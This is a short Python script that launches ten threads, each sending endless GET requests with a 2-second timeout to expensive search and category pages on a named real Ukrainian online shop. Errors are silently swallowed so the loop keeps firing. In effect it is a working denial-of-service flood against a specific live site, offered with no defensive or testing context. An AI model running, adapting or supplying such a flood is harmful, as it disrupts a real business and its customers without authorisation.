from requests_html import HTMLSession
from random import choice
from concurrent.futures import ThreadPoolExecutor


urls = [
    'https://kartochki-domana.com.ua/ru/?s=%D0%BA%D0%B0&submit=Search&post_type=product',
    'https://kartochki-domana.com.ua/ru/?s=%D0%BD%D0%B0%D0%B1&submit=Search&post_type=product',
    'https://kartochki-domana.com.ua/ru/product-category/ukrainskie-kartochki/?orderby=popularity&per_page=100',
    'https://kartochki-domana.com.ua/ru/product-category/russkie-kartochki/?orderby=popularity&per_page=150',
    'https://kartochki-domana.com.ua/ru/product-category/russkie-kartochki/?orderby=price-desc&per_page=150',
    'https://kartochki-domana.com.ua/ru/?orderby=relevance&s=%D0%BA%D0%B0&post_type=product&per_page=280',
    'https://kartochki-domana.com.ua/ru/?orderby=price&s=%D0%BA%D0%B0&post_type=product&per_page=280',
]

def worker():
    session = HTMLSession()
    while True:
        try:
            url = choice(urls)
            # Wait by default 30sec
            # session.get(url)
            # Wait 2 sec and send new request
            session.get(url, timeout=2)
            print(url)
        except:
            print('New request!')


with ThreadPoolExecutor(max_workers=10) as ex:
    for _ in range(10):
        ex.submit(worker)
